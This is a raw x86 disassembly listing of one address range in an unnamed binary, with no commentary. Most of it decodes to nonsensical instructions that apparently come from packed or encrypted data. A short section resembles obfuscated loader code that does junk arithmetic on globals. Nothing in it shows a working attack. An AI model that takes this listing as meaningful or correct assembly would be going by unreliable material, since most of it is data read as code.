  405298:	add    edx,DWORD PTR [edi+0x76954f1c]
  40529e:	inc    ebp
  40529f:	in     eax,0xd2
  4052a1:	hlt    
  4052a2:	dec    ecx
  4052a3:	loop   0x40524c
  4052a5:	retf   0x6b00
  4052a8:	jmp    0x1bdbdbe8
  4052ad:	cmp    DWORD PTR [edx+0x1b1cde70],ecx
  4052b3:	icebp  
  4052b4:	mov    edi,0x7ebec121
  4052b9:	lods   eax,DWORD PTR ds:[esi]
  4052ba:	xchg   edx,eax
  4052bb:	stc    
  4052bc:	(bad)  
  4052bd:	cld    
  4052be:	addr16 mov ebp,0x7fcc0fdc
  4052c4:	ins    DWORD PTR es:[edi],dx
  4052c5:	iret   
  4052c6:	inc    ecx
  4052c7:	imul   esi,DWORD PTR [ecx+0x42],0xfffffff9
  4052cb:	jae    0x4052e8
  4052cd:	inc    ecx
  4052ce:	jno    0x405337
  4052d0:	in     al,dx
  4052d1:	pop    edx
  4052d2:	or     eax,0x599507b
  4052d7:	nop
  4052d8:	icebp  
  4052d9:	lock push edx
  4052db:	std    
  4052dc:	ror    BYTE PTR [edi+edi*1],cl
  4052df:	add    eax,0x90a0b612
  4052e4:	nop
  4052e5:	ret    
  4052e6:	sbb    al,0xcd
  4052e8:	daa    
  4052e9:	int3   
  4052ea:	rcr    BYTE PTR [eax],cl
  4052ec:	mov    ebp,0x5af8dce5
  4052f1:	not    DWORD PTR [ecx]
  4052f3:	out    dx,al
  4052f4:	idiv   BYTE PTR [eax+0x38]
  4052f7:	push   esp
  4052f8:	dec    edi
  4052f9:	arpl   WORD PTR [ecx-0x37593a02],sp
  4052ff:	cmp    eax,0xc1e1e1de
  405304:	xor    ah,BYTE PTR [edi-0x6080be2b]
  40530a:	outs   dx,DWORD PTR ds:[esi]
  40530b:	or     dl,BYTE PTR [ecx]
  40530d:	mov    DWORD PTR [esi+0xeb13fdb],esp
  405313:	arpl   WORD PTR [edx],sp
  405315:	imul   ebp,DWORD PTR [eax-0x1e9d1d48],0xffffffef
  40531c:	push   esi
  40531d:	cmp    DWORD PTR [edi],0x99cbb654
  405323:	pop    ecx
  405324:	push   edi
  405325:	les    eax,FWORD PTR [edx-0x7d0ef95d]
  40532b:	sahf   
  40532c:	jo     0x405383
  40532e:	xchg   ebp,eax
  40532f:	lea    esp,[ebx+0x60916b78]
  405335:	jb     0x40534d
  405337:	dec    esp
  405338:	int3   
  405339:	(bad)  
  40533a:	je     0x4052dc
  40533c:	cmp    BYTE PTR [ebx+0x3],dh
  40533f:	sbb    al,0x69
  405341:	retf   0x962e
  405344:	mov    ebx,0x7c5b0a3d
  405349:	repz icebp 
  40534b:	rol    BYTE PTR [edx+0x3334f8fa],0x68
  405352:	cld    
  405353:	cmp    esp,ebp
  405355:	pop    ecx
  405356:	lods   eax,DWORD PTR ds:[esi]
  405357:	jmp    0x4053b4
  405359:	jge    0x40533b
  40535b:	xchg   edx,eax
  40535c:	mov    ch,0x5f
  40535e:	rol    esp,cl
  405360:	add    eax,0x3a40ed68
  405365:	and    eax,0x8bd461b1
  40536a:	and    edx,DWORD PTR [ecx]
  40536c:	mov    ds:0x46d4b09f,al
  405371:	stc    
  405372:	mov    al,0xe1
  405374:	and    BYTE PTR [esi+0x3c],bl
  405377:	push   ss
  405378:	sti    
  405379:	dec    eax
  40537a:	mov    ch,0x82
  40537c:	xchg   BYTE PTR [ecx+0x339f6319],dl
  405382:	fwait
  405383:	mov    ds:0x95d69679,al
  405388:	xor    BYTE PTR [ebx-0x54],bl
  40538b:	ja     0x40530f
  40538d:	dec    edi
  40538e:	sahf   
  40538f:	and    bh,dl
  405391:	push   cs
  405392:	push   0xffffffe4
  405394:	imul   DWORD PTR [edi]
  405396:	retf   0x7394
  405399:	ret    
  40539a:	aaa    
  40539b:	mov    bl,0x9a
  40539d:	adc    DWORD PTR ds:0xdb4c1087,0xffffffee
  4053a4:	aam    0xb8
  4053a6:	sub    ebp,DWORD PTR ds:0x3b1ee7dd
  4053ac:	mov    ds:0xc50323e9,eax
  4053b1:	test   eax,0x8bf43f3
  4053b6:	xor    eax,0x6b490bf9
  4053bb:	cdq    
  4053bc:	call   0x194a2797
  4053c1:	stos   DWORD PTR es:[edi],eax
  4053c2:	xor    cl,BYTE PTR [ecx]
  4053c4:	mov    bh,0xeb
  4053c6:	jno    0x4053af
  4053c8:	dec    esp
  4053c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053ca:	icebp  
  4053cb:	mov    al,0xa3
  4053cd:	psllw  mm6,mm2
  4053d0:	(bad)  
  4053d1:	jne    0x4053e7
  4053d3:	xor    ebx,0xbc85c637
  4053d9:	int3   
  4053da:	inc    ecx
  4053db:	std    
  4053dc:	jmp    0x40540e
  4053de:	das    
  4053df:	nop
  4053e0:	aam    0x8c
  4053e2:	fidiv  WORD PTR [edi+0x5d8b9806]
  4053e8:	sbb    al,0x20
  4053ea:	in     al,0x0
  4053ec:	popa   
  4053ed:	pop    edx
  4053ee:	inc    ebp
  4053ef:	outs   dx,DWORD PTR ds:[esi]
  4053f0:	imul   esi,DWORD PTR [edi-0x24755b70],0xd5799891
  4053fa:	test   eax,0x691b3d31
  4053ff:	outs   dx,BYTE PTR ds:[esi]
  405400:	xlat   BYTE PTR ds:[ebx]
  405401:	mov    ah,0x81
  405403:	push   cs
  405404:	stos   DWORD PTR es:[edi],eax
  405405:	xchg   esi,eax
  405406:	cmp    al,0x64
  405408:	dec    eax
  405409:	cmp    eax,DWORD PTR [eax+0xd]
  40540c:	xchg   BYTE PTR [esi],al
  40540e:	jecxz  0x4053ec
  405410:	inc    ebp
  405411:	or     bl,BYTE PTR [esi+0x68fddf82]
  405417:	retf   0x25cb
  40541a:	neg    cl
  40541c:	cwde   
  40541d:	jmp    0x4d76:0xa2be6b60
  405424:	inc    esp
  405425:	jb     0x40549b
  405427:	lock add al,0x8b
  40542a:	jo     0x4053fc
  40542c:	retf   
  40542d:	je     0x405471
  40542f:	ins    DWORD PTR es:[edi],dx
  405430:	cmc    
  405431:	xchg   edi,eax
  405432:	mov    bh,0xdb
  405434:	xchg   edx,eax
  405435:	ja     0x405455
  405437:	add    DWORD PTR [esi],ecx
  405439:	sub    edx,esi
  40543b:	(bad)  
  40543c:	mov    DWORD PTR [esi-0x63133f76],ebp
  405442:	fdiv   DWORD PTR [edx+0x24068d37]
  405448:	(bad)  
  405449:	cmp    eax,0xcbb60ade
  40544e:	retf   0x9185
  405451:	push   ds
  405452:	inc    edi
  405453:	cmc    
  405454:	lods   eax,DWORD PTR ds:[esi]
  405455:	add    ebp,DWORD PTR [ecx]
  405457:	sub    ebx,0xf6659cda
  40545d:	es dec eax
  40545f:	mov    eax,0x2eaddd44
  405464:	mov    al,0x30
  405466:	retf   
  405467:	test   DWORD PTR [eax-0x7e],ebx
  40546a:	or     eax,0x93b4ab1b
  40546f:	xor    al,dh
  405471:	repnz add al,bh
  405474:	leave  
  405475:	mov    al,0x7d
  405477:	xchg   ebp,eax
  405478:	aam    0x4f
  40547a:	cmp    DWORD PTR [ecx+eax*8+0x16],esi
  40547e:	mov    esp,0x5075b20b
  405483:	iret   
  405484:	push   ss
  405485:	int    0x39
  405487:	(bad)  
  405488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405489:	push   es
  40548a:	pop    ds
  40548b:	mov    bl,0x84
  40548d:	push   esi
  40548e:	mov    edi,0x6c85728f
  405493:	add    BYTE PTR [ebx-0x38],dh
  405496:	in     al,dx
  405497:	lods   al,BYTE PTR ds:[esi]
  405498:	and    BYTE PTR [edi+0x2c],0x45
  40549c:	or     BYTE PTR [ebx],bl
  40549e:	dec    esp
  40549f:	shl    BYTE PTR [ecx],cl
  4054a1:	dec    edi
  4054a2:	out    dx,eax
  4054a3:	pop    edx
  4054a4:	mov    eax,0x13235687
  4054a9:	imul   edi,DWORD PTR [ebp+0x5],0x61
  4054ad:	sub    al,0xad
  4054af:	xlat   BYTE PTR ds:[ebx]
  4054b0:	or     al,0xb2
  4054b2:	push   ebp
  4054b3:	sete   BYTE PTR [ecx+ecx*2]
  4054b7:	cs loopne 0x4054b5
  4054ba:	int    0xdf
  4054bc:	int3   
  4054bd:	int3   
  4054be:	add    edx,edi
  4054c0:	mov    esp,0xba1bf4ff
  4054c5:	push   edx
  4054c6:	jb     0x4054af
  4054c8:	dec    DWORD PTR [ebp*2-0x26048a08]
  4054cf:	mov    bl,0x41
  4054d1:	pop    edi
  4054d2:	in     eax,dx
  4054d3:	push   ecx
  4054d4:	(bad)  [edx+0x7]
  4054d7:	jnp    0x4054ae
  4054d9:	xchg   bh,ch
  4054db:	xchg   esp,eax
  4054dc:	xchg   ebp,eax
  4054dd:	ficomp DWORD PTR [eax]
  4054df:	inc    eax
  4054e0:	adc    cl,bl
  4054e2:	rcr    DWORD PTR [eax-0x44],cl
  4054e5:	mov    ch,0xa1
  4054e7:	fwait
  4054e8:	inc    edi
  4054e9:	inc    esp
  4054ea:	inc    ebx
  4054eb:	es push ds
  4054ed:	cmp    BYTE PTR [edi+0x68],cl
  4054f0:	(bad)  
  4054f1:	in     al,0x94
  4054f3:	clc    
  4054f4:	jbe    0x40548e
  4054f6:	iret   
  4054f7:	shr    ch,0x2f
  4054fa:	test   BYTE PTR [esi+0x2a],bh
  4054fd:	repz test al,0xa8
  405501:	jp     0x4054c3
  405503:	xchg   esi,eax
  405504:	div    DWORD PTR [ecx+0x4]
  405507:	loop   0x4054b0
  405509:	jo     0x405494
  40550b:	jge    0x405581
  40550d:	test   BYTE PTR cs:[esi+0x36],al
  405511:	adc    ch,al
  405513:	sub    ah,BYTE PTR [ebp+ecx*8+0x2f345cec]
  40551a:	cld    
  40551b:	test   BYTE PTR [ecx-0x1e],ch
  40551e:	lods   al,BYTE PTR ds:[esi]
  40551f:	xor    dl,BYTE PTR [bp+di+0x32ff]
  405524:	jmp    0x22a3:0x95d8b4f1
  40552b:	jl     0x405576
  40552d:	mov    bh,BYTE PTR [ebx+esi*1]
  405530:	inc    esi
  405531:	mov    ebx,edx
  405533:	xchg   esi,eax
  405534:	pop    esi
  405535:	addr16 in al,dx
  405537:	stos   DWORD PTR es:[edi],eax
  405538:	retf   0xac16
  40553b:	je     0x405541
  40553d:	test   DWORD PTR [eax-0x5d],esi
  405540:	fldcw  WORD PTR [edx]
  405542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405543:	(bad)  
  405545:	sti    
  405546:	aad    0x33
  405548:	mov    dh,0xf4
  40554a:	adc    DWORD PTR [eax+eiz*4],edi
  40554d:	xchg   ebx,eax
  40554e:	lahf   
  40554f:	shr    ecx,1
  405551:	xchg   DWORD PTR [ebp+0xa],edi
  405554:	inc    ecx
  405555:	dec    ecx
  405556:	loopne 0x405510
  405558:	hlt    
  405559:	pop    esp
  40555a:	xchg   esp,eax
  40555b:	mov    BYTE PTR [ecx+esi*8+0x7e],bh
  40555f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405560:	aam    0x56
  405562:	mov    eax,ds:0x3df006b
  405567:	out    dx,eax
  405568:	xor    dh,BYTE PTR [ebp+0x1b]
  40556b:	imul   edx,DWORD PTR [ebp+0x7d5481a4],0xadb1b4d
  405575:	cmc    
  405576:	xchg   ecx,esi
  405578:	lods   eax,DWORD PTR ds:[esi]
  405579:	loopne 0x405560
  40557b:	mov    cl,BYTE PTR [esi+0x46]
  40557e:	adc    al,BYTE PTR [esi+0x892d2f0]
  405584:	mov    bl,0xc8
  405586:	stos   DWORD PTR es:[edi],eax
  405587:	fisubr WORD PTR [edx+0x79]
  40558a:	dec    BYTE PTR [ecx-0x6c]
  40558d:	fwait
  40558e:	pop    ss
  40558f:	das    
  405590:	popa   
  405591:	adc    al,dh
  405593:	add    eax,ebp
  405595:	out    0x12,eax
  405597:	mov    DWORD PTR [ecx+0x4a],edi
  40559a:	loop   0x40557d
  40559c:	mov    ebp,0x9e59a1c9
  4055a1:	sti    
  4055a2:	sub    DWORD PTR [ecx+0x23],esi
  4055a5:	hlt    
  4055a6:	retf   0x60e9
  4055a9:	mov    ah,0x2
  4055ab:	or     al,ch
  4055ad:	in     eax,0xd7
  4055af:	push   ebp
  4055b0:	inc    ebx
  4055b1:	or     bh,BYTE PTR [ebx+0x16]
  4055b4:	into   
  4055b5:	repz mov ah,0x36
  4055b8:	mov    cl,0x2
  4055ba:	sub    cl,BYTE PTR [ebp+0x5a]
  4055bd:	pop    edi
  4055be:	inc    edi
  4055bf:	pop    ebx
  4055c0:	sub    ebx,DWORD PTR [esi]
  4055c2:	in     al,dx
  4055c3:	out    0xdf,eax
  4055c5:	jae    0x405555
  4055c7:	fcomp  QWORD PTR [ebp+0x5f1d7991]
  4055cd:	fwait
  4055ce:	ret    
  4055cf:	pop    ds
  4055d0:	mov    esp,0x5b7210b8
  4055d5:	xchg   DWORD PTR [eax-0x4ab37905],ebx
  4055db:	ja     0x4055db
  4055dd:	gs mov cl,0xe5
  4055e0:	out    0x60,eax
  4055e2:	pop    edx
  4055e3:	fnstcw WORD PTR [eax]
  4055e5:	jb     0x405596
  4055e7:	in     al,dx
  4055e8:	mov    bh,0xf5
  4055ea:	pop    edi
  4055eb:	int    0x42
  4055ed:	ins    DWORD PTR es:[edi],dx
  4055ee:	push   esp
  4055ef:	aam    0x14
  4055f1:	fdivr  st,st(1)
  4055f3:	cwde   
  4055f4:	or     bh,BYTE PTR ds:[edi+0x1d]
  4055f8:	or     edx,DWORD PTR [ecx+edx*4+0x1571102]
  4055ff:	xchg   edi,eax
  405600:	std    
  405601:	cmp    esp,0x23
  405604:	push   ds
  405605:	or     al,0x10
  405607:	ret    
  405608:	mov    esp,0xdad3c3a
  40560d:	out    0x50,al
  40560f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405610:	jne    0x405658
  405612:	adc    al,cl
  405614:	pop    eax
  405615:	loop   0x405662
  405617:	scas   eax,DWORD PTR es:[edi]
  405618:	fnstenv [edx-0x4c4b877f]
  40561e:	xor    eax,0x9f6e1d12
  405623:	pop    edi
  405624:	cmp    DWORD PTR [edi+0x23],eax
  405627:	test   al,0xc0
  405629:	mov    ebx,0xc8f895a3
  40562e:	jg     0x4055b6
  405630:	mov    ebx,0x4b54da06
  405635:	ret    0x5247
  405638:	xchg   edi,eax
  405639:	lock ror BYTE PTR [edx+0x3],1
  40563d:	push   0x12dc77d6
  405642:	hlt    
  405643:	xchg   ebx,eax
  405644:	cs inc ebx
  405646:	add    eax,DWORD PTR [ebx]
  405648:	retf   0xce5f
  40564b:	aaa    
  40564c:	push   ss
  40564d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40564e:	dec    edi
  40564f:	ret    
  405650:	mov    ebx,0xf14d1599
  405655:	imul   ebx,DWORD PTR [edx],0xfffffffd
  405658:	mov    al,ds:0x662eaa6c
  40565d:	xchg   ebx,eax
  40565e:	leave  
  40565f:	jo     0x40563e
  405661:	aad    0xba
  405663:	das    
  405664:	dec    edi
  405665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405666:	xchg   esp,eax
  405667:	xor    eax,0x42649d21
  40566c:	int3   
  40566d:	fmulp  st(1),st
  40566f:	mov    ah,0xb4
  405671:	sub    ecx,DWORD PTR [eax+eiz*2+0x1d089d7e]
  405678:	jae    0x40565d
  40567a:	test   DWORD PTR ds:0xe488e5f9,ebp
  405680:	ret    0xe2ba
  405683:	mov    eax,ds:0x94aea498
  405688:	pop    esp
  405689:	jmp    0x32aa2b3
  40568e:	mov    ds:0xa51cfac0,eax
  405693:	add    DWORD PTR [ebx],ecx
  405695:	xchg   edi,eax
  405696:	lock nop
  405698:	and    dl,0x3f
  40569b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40569c:	repz mov eax,ds:0x2c4147e3
  4056a2:	test   al,0x4f
  4056a4:	fs shl edi,cl
  4056a7:	xchg   ebx,eax
  4056a8:	ins    BYTE PTR es:[edi],dx
  4056a9:	cmp    ebp,esp
  4056ab:	mov    ah,bh
  4056ad:	adc    BYTE PTR [esi],bl
  4056af:	add    ebx,DWORD PTR [edi]
  4056b1:	test   eax,0x73fc0e93
  4056b6:	sbb    BYTE PTR [ebx-0x167aa436],0xe
  4056bd:	xor    edx,DWORD PTR [ebx]
  4056bf:	jmp    0x4056ff
  4056c1:	xchg   ebx,eax
  4056c2:	mov    ecx,0x872fc29d
  4056c7:	or     DWORD PTR [edx*1+0x2198f74],0xfffffff3
  4056cf:	inc    eax
  4056d0:	fs std 
  4056d2:	jecxz  0x40574f
  4056d4:	mov    DWORD PTR [eax],eax
  4056d6:	(bad)  
  4056d7:	loop   0x405707
  4056d9:	add    eax,0xab0f3140
  4056de:	retf   
  4056df:	ret    0xabb6
  4056e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056e3:	stos   DWORD PTR es:[edi],eax
  4056e4:	pusha  
  4056e5:	mov    ebx,0x625be461
  4056ea:	jg     0x40569b
  4056ec:	cdq    
  4056ed:	out    dx,al
  4056ee:	add    esi,DWORD PTR [eax-0x2d752a6f]
  4056f4:	cld    
  4056f5:	les    ecx,FWORD PTR [edx+0x3724dbbb]
  4056fb:	repz mov bl,0xae
  4056fe:	dec    eax
  4056ff:	push   ds
  405700:	lea    ebx,[ebx-0x6b]
  405703:	mov    ebx,0xf741f617
  405708:	push   ebp
  405709:	aas    
  40570a:	outs   dx,BYTE PTR ds:[esi]
  40570b:	hlt    
  40570c:	inc    esp
  40570d:	shl    ecx,0x1e
  405710:	lea    ecx,[edx+eax*1]
  405713:	mov    eax,DWORD PTR [ebx]
  405715:	movzx  edx,WORD PTR ds:0x4228ca
  40571c:	or     edx,DWORD PTR ds:0x4229ae
  405722:	mov    DWORD PTR ds:0x4228ca,edx
  405728:	mov    edx,DWORD PTR [ebx+0x4]
  40572b:	sub    DWORD PTR ds:0x4228de,0x42296a
  405735:	shrd   eax,edx,0x2
  405739:	shr    edx,0x2
  40573c:	cmp    DWORD PTR ds:0x422936,0x0
  405743:	mov    DWORD PTR ds:0x42296a,edx
  405749:	mov    DWORD PTR ds:0x4229ca,0x5a5b
  405753:	mov    DWORD PTR ds:0x422952,0x59ac
  40575d:	jmp    0x4057b9
  405762:	not    edx
  405764:	mov    edx,DWORD PTR ds:0x4228aa
  40576a:	jbe    0x4057a1
  405770:	push   0x1
  405772:	push   0x68d9
  405777:	call   DWORD PTR ds:0x42a29c
  40577d:	mov    edx,DWORD PTR ds:0x4229ce
  405783:	add    DWORD PTR ds:0x422922,edx
  405789:	xor    edx,edx
  40578b:	or     edx,DWORD PTR ds:0x422926
  405791:	add    DWORD PTR ds:0x42297a,edx
  405797:	or     DWORD PTR ds:0x4228d6,0x1005
  4057a1:	add    DWORD PTR ds:0x4228ae,ecx
  4057a7:	mov    DWORD PTR ds:0x422912,0x7731
  4057b1:	add    edx,0x5dfe
  4057b7:	not    edx
  4057b9:	mov    DWORD PTR [ebp-0x1c],eax
  4057bc:	mov    edx,DWORD PTR ds:0x422982
  4057c2:	or     DWORD PTR ds:0x4228c2,edx
  4057c8:	mov    eax,DWORD PTR [ebx]
  4057ca:	jmp    0x405d54
  4057cf:	loope  0x405800
  4057d1:	adc    eax,0x58a019aa
  4057d6:	adc    al,0x1b
  4057d8:	push   ds
  4057d9:	fsubr  DWORD PTR [eax+0x68e88750]
  4057df:	adc    DWORD PTR [ecx+0x43d1616],esp
  4057e5:	push   ss
  4057e6:	push   ss
  4057e7:	jmp    0xe652:0x8414a094
  4057ee:	mov    al,0xf1
  4057f0:	sbb    edi,DWORD PTR [edx+0x27]
  4057f3:	or     eax,0x5ba898c8
  4057f8:	mov    edi,0x9f00d2cd
  4057fd:	sbb    DWORD PTR [ecx],ebp
  4057ff:	aam    0x6f
  405801:	in     eax,dx
  405802:	inc    edx
  405803:	pushf  
  405804:	push   edx
  405805:	retf   0xd146
  405808:	adc    DWORD PTR [edx+0x42247c4],ebp
  40580e:	xor    BYTE PTR [ebx+esi*2+0x47],ch
  405812:	jge    0x405801
  405814:	xchg   esi,eax
  405815:	fiadd  WORD PTR [ebx-0x21]
  405818:	or     eax,0x9100c937
  40581d:	pop    edx
  40581e:	mov    al,ds:0x6492708b
  405823:	xlat   BYTE PTR ds:[ebx]
  405824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405825:	mov    ebp,0xa8c5c497
  40582a:	adc    al,BYTE PTR [ebx+esi*2-0x6]
  40582e:	jp     0x405806
  405830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405831:	out    dx,eax
  405832:	push   edi
  405833:	inc    eax
  405834:	cmc    
  405835:	and    DWORD PTR [edx+0x416b3ec9],esp
  40583b:	in     al,0x9
  40583d:	push   0x88851d9c
  405842:	pop    DWORD PTR [edx]
  405844:	enter  0xfeac,0xeb
  405848:	jmp    0x4057f6
  40584a:	jmp    0x6657190e
  40584f:	jmp    DWORD PTR [esi+0x3c]
  405852:	ds mov ebp,0x6d03582b
  405858:	push   ebx
  405859:	test   DWORD PTR [eax+ebx*8+0x1b],ecx
  40585d:	cdq    
  40585e:	aas    
  40585f:	hlt    
  405860:	pop    es
  405861:	ret    
  405862:	stos   BYTE PTR es:[edi],al
  405863:	ins    BYTE PTR es:[edi],dx
  405864:	pop    es
  405865:	dec    ebx
  405866:	inc    ecx
  405867:	cmp    BYTE PTR [edx+0x2c],al
  40586a:	xor    eax,0xe809d431
  40586f:	or     eax,0x1df1f118
  405874:	mov    al,bl
  405876:	lock ins BYTE PTR es:[edi],dx
  405878:	clc    
  405879:	inc    ebx
  40587a:	fsubr  DWORD PTR [edx]
  40587c:	pop    edi
  40587d:	test   eax,0xd31ac7ae
  405882:	adc    cl,bh
  405884:	icebp  
  405885:	push   es
  405886:	(bad)
  40588a:	cmp    ebp,DWORD PTR [edi+0x61f3a5ad]
  405890:	lds    ebp,FWORD PTR [eax-0x67e34877]
  405896:	inc    esp
  405897:	push   ecx
  405898:	in     eax,dx
  405899:	int3   
  40589a:	popf   
  40589b:	ds stos BYTE PTR es:[edi],al
  40589d:	repnz cwde 
  40589f:	je     0x4058d3
  4058a1:	js     0x405848
  4058a3:	(bad)  [esi+0x1c0a2445]
  4058a9:	jl     0x4058e6
  4058ab:	idiv   BYTE PTR [ebp-0x3b]
  4058ae:	fcomi  st,st(4)
  4058b0:	sbb    ecx,DWORD PTR [ebx+eiz*1-0x4328823c]
  4058b7:	cmp    ecx,DWORD PTR [esp+edi*2]
  4058ba:	xor    cl,bh
  4058bc:	out    dx,al
  4058bd:	loope  0x4058e5
  4058bf:	mov    ah,0x16
  4058c1:	adc    DWORD PTR [edi+0x3],0x4c76ef52
  4058c8:	cli    
  4058c9:	cdq    
  4058ca:	imul   esp,DWORD PTR [esi+eiz*2+0x6bbde065],0xbc4d0c4c
  4058d5:	pop    edi
  4058d6:	and    al,0x7a
  4058d8:	(bad)  
  4058d9:	lahf   
  4058da:	jmp    0x590c:0xd64d5788
  4058e1:	loop   0x405895
  4058e3:	pop    esi
  4058e4:	into   
  4058e5:	dec    BYTE PTR ds:0xe7a4fdc3
  4058eb:	sbb    BYTE PTR [ecx+0x36a57118],0x33
  4058f2:	outs   dx,DWORD PTR ds:[esi]
  4058f3:	cwde   
  4058f4:	adc    BYTE PTR [ecx+eiz*4],al
  4058f7:	repnz jecxz 0x4058c9
  4058fa:	cs add edx,esp
  4058fd:	inc    eax
  4058ff:	loop   0x405942
  405901:	test   eax,0x4c0c0c0d
  405906:	cmp    dl,BYTE PTR ds:0x6033ebb5
  40590c:	dec    edx
  40590d:	ret    0xe49e
  405910:	pushf  
  405911:	(bad)  
  405912:	mov    dh,0xd3
  405914:	loop   0x4058cc
  405916:	jmp    0x49cb:0xf542148b
  40591d:	fcomip st,st(7)
  40591f:	call   0x10db71a0
  405924:	add    eax,0x15bc0518
  405929:	fnsave [ebx-0x5a]
  40592c:	add    BYTE PTR [esi-0x6a8c36b1],ch
  405932:	in     eax,0xd6
  405934:	aam    0x57
  405936:	inc    ecx
  405937:	inc    ebx
  405938:	(bad)  
  405939:	pusha  
  40593a:	dec    edx
  40593b:	mov    dh,0x7e
  40593d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40593f:	gs inc ecx
  405941:	lock in eax,0x31
  405944:	or     BYTE PTR [eax+0x24],dl
  405947:	mov    eax,0xcc7fd641
  40594c:	mov    dl,0x46
  40594e:	mov    BYTE PTR [esi],al
  405950:	jnp    0x4059af
  405952:	dec    ecx
  405953:	inc    ebx
  405954:	out    dx,al
  405955:	add    al,0xbd
  405957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405958:	(bad)  
  405959:	in     al,0xee
  40595b:	scas   eax,DWORD PTR es:[edi]
  40595c:	out    dx,eax
  40595d:	cmc    
  40595e:	outs   dx,DWORD PTR ds:[esi]
  40595f:	adc    DWORD PTR [ecx],ebp
  405961:	pop    ebp
  405962:	mov    bh,0x13
  405964:	push   es
  405965:	mov    dh,0x58
  405967:	xor    al,0x22
  405969:	jecxz  0x4059a2
  40596b:	cmc    
  40596c:	mov    ebx,0x71d68a40
  405971:	xor    bl,BYTE PTR [esi+0x4f]
  405974:	and    BYTE PTR [edi-0x34],dl
  405977:	vunpckhpd xmm5,xmm1,XMMWORD PTR [ebx+edi*2+0x62]
  40597d:	ror    DWORD PTR [edx-0x19],cl
  405980:	fmul   QWORD PTR [edi+0x6f]
  405983:	icebp  
  405984:	ret    0xd19a
  405987:	mov    ds:0x74260083,al
  40598c:	das    
  40598d:	les    esp,FWORD PTR [ebx+0x6c]
  405990:	xchg   ecx,eax
  405991:	test   BYTE PTR [esi-0x2264cbb8],ch
  405997:	jo     0x4059b4
  405999:	lea    eax,ds:0xf4b5a220
  40599f:	fistp  DWORD PTR [ebp+0x33b6ea20]
  4059a5:	fistp  QWORD PTR [ebp+0x7e]
  4059a8:	mov    edi,ebp
  4059aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ab:	sbb    dl,ah
  4059ad:	pop    edi
  4059ae:	(bad)  
  4059af:	sbb    eax,0x9dd53c3d
  4059b4:	dec    ebx
  4059b5:	ins    DWORD PTR es:[edi],dx
  4059b6:	icebp  
  4059b7:	retf   
  4059b8:	jbe    0x4059e3
  4059ba:	jo     0x405a16
  4059bc:	fldcw  WORD PTR [edx+ebx*8-0x7c]
  4059c0:	int    0x40
  4059c2:	add    al,0x4e
  4059c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059c5:	sbb    BYTE PTR [ebx-0x3449178c],dl
  4059cb:	std    
  4059cc:	sub    BYTE PTR [edx-0x3b1574e0],ah
  4059d2:	adc    BYTE PTR [edx-0x21],dl
  4059d5:	push   ebp
  4059d6:	lahf   
  4059d7:	mov    DWORD PTR [ebx],esp
  4059d9:	cmp    ebp,DWORD PTR [ebp+0x18]
  4059dc:	pop    esp
  4059dd:	xchg   dh,ch
  4059df:	int3   
  4059e0:	dec    ecx
  4059e1:	jge    0x405a06
  4059e3:	inc    esi
  4059e4:	scas   al,BYTE PTR es:[edi]
  4059e5:	sbb    dl,BYTE PTR [eax-0x709e6987]
  4059eb:	aam    0x44
  4059ed:	mov    ecx,0x97b9408b
  4059f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f3:	dec    edi
  4059f4:	into   
  4059f5:	lods   al,BYTE PTR ds:[esi]
  4059f6:	out    dx,eax
  4059f7:	cmc    
  4059f8:	mov    esi,edi
  4059fa:	nop
  4059fb:	out    dx,eax
  4059fc:	mov    eax,0xf0432ad5
  405a01:	jl     0x405a34
  405a03:	jnp    0x4059c5
  405a05:	lea    esi,[edx]
  405a07:	call   0x6e63:0x43314fa
  405a0e:	das    
  405a0f:	imul   esp,esi,0xffffff81
  405a12:	or     eax,esp
  405a14:	fisub  DWORD PTR [ecx]
  405a16:	lds    ebx,FWORD PTR [ebx]
  405a18:	mov    ?,WORD PTR [eax+0x1]
  405a1b:	sub    ch,BYTE PTR [esi+ebp*4]
  405a1e:	adc    ebp,DWORD PTR [eax+0xe9a5abf]
  405a24:	xor    eax,0xe1447d38
  405a29:	loopne 0x4059e6
  405a2b:	mov    eax,ds:0xa2e3c60e
  405a30:	jg     0x405a34
  405a32:	xor    eax,0x389b7a1a
  405a37:	xchg   bl,cl
  405a39:	xor    cl,BYTE PTR [ecx-0x9]
  405a3c:	imul   edi,eax,0x7c
  405a3f:	xchg   BYTE PTR [ebp+0x40],al
  405a42:	jmp    0xfc27e2d8
  405a47:	mov    ds:0x5ad5a5e4,eax
  405a4c:	je     0x405a93
  405a4e:	clc    
  405a4f:	stos   DWORD PTR es:[edi],eax
  405a50:	call   0x910f505b
  405a55:	or     BYTE PTR [edi-0x4c],bl
  405a58:	daa    
  405a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a5a:	rol    edi,1
  405a5c:	in     al,0xab
  405a5e:	mov    al,0xbd
  405a60:	ret    
  405a61:	mov    sp,0xdfed
  405a65:	sub    al,0xe2
  405a67:	cld    
  405a68:	iret   
  405a69:	cmp    dl,BYTE PTR [eax]
  405a6b:	inc    ebx
  405a6c:	xchg   DWORD PTR [edx-0xa],ebp
  405a6f:	and    ecx,0x77e9d2ac
  405a75:	jecxz  0x405ac0
  405a77:	stos   BYTE PTR es:[edi],al
  405a78:	fcmovne st,st(1)
  405a7a:	cmp    eax,ebx
  405a7c:	cwde   
  405a7d:	mov    ebp,0x33f8f8f8
  405a82:	ret    0x4b4e
  405a85:	int    0xf7
  405a87:	or     eax,0x6702670e
  405a8c:	mov    esi,0x97379d00
  405a91:	push   ss
  405a92:	ins    BYTE PTR es:[edi],dx
  405a93:	sub    cl,ah
